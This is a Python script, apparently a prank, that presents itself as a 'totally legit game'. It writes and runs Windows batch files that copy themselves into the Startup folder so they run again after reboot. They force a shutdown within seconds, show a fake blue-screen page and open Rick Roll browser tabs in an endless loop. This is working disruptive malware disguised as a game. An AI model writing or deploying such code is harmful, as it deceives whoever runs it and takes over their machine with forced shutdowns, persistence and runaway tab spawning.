# by andy... enjoy this totally legit game!!
import subprocess, os

if os.path.exists('coolergame.bat'):
    os.remove('coolergame.bat')
if os.path.exists('rickloop.bat'):
    os.remove('rickloop.bat')
if os.path.exists('coolestgame.bat'):
    os.remove('coolestgame.bat')

coolergame = open('coolergame.bat', 'w')
coolergame.write('''@echo off
echo welcome to coolergame!
pause
start https://www.youtube.com/watch?v=dQw4w9WgXcQ
echo we know the game and we're gonna play it...
pause
start https://www.youtube.com/watch?v=dQw4w9WgXcQ
start https://www.youtube.com/watch?v=dQw4w9WgXcQ
start https://www.youtube.com/watch?v=dQw4w9WgXcQ
start https://www.youtube.com/watch?v=dQw4w9WgXcQ
start https://www.youtube.com/watch?v=dQw4w9WgXcQ
echo initiaiting shutdown sequence...
pause
shutdown -s -f -t 3 -c "have you ever considered closing the command prompt"
:a
start https://www.youtube.com/watch?v=dQw4w9WgXcQ
goto a''')
coolergame.close()

rickloop = open('rickloop.bat', 'w')
rickloop.write('''@echo off
cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
start lasthope.bat
@echo del /q rickloop.bat> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\lasthope.bat"
echo del /q lasthope.bat>> "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\lasthope.bat"
shutdown -s -f -t 20 -c "did you know: coolestgame is so cool that it can revive itself a few times after crashing?"
:a
start https://cdn.vox-cdn.com/thumbor/9j-s_MPUfWM4bWdZfPqxBxGkvlw=/1400x1050/filters:format(jpeg)/cdn.vox-cdn.com/uploads/chorus_asset/file/22312759/rickroll_4k.jpg
goto a''')
rickloop.close()

coolestgame = open('coolestgame.bat', 'w')
coolestgame.write('''@echo off
copy /y coolergame.bat "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
copy /y rickloop.bat "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
shutdown -s -f -t 20 -c "welcome to coolestgame.py!
start http://fakebsod.com/windows-8-and-10
timeout 5
:a
start https://www.youtube.com/watch?v=dQw4w9WgXcQ
goto a''')
coolestgame.close()

subprocess.call('coolestgame.bat')

if os.path.exists('coolergame.bat'):
    os.remove('coolergame.bat')
if os.path.exists('rickloop.bat'):
    os.remove('rickloop.bat')
if os.path.exists('coolestgame.bat'):
    os.remove('coolestgame.bat')
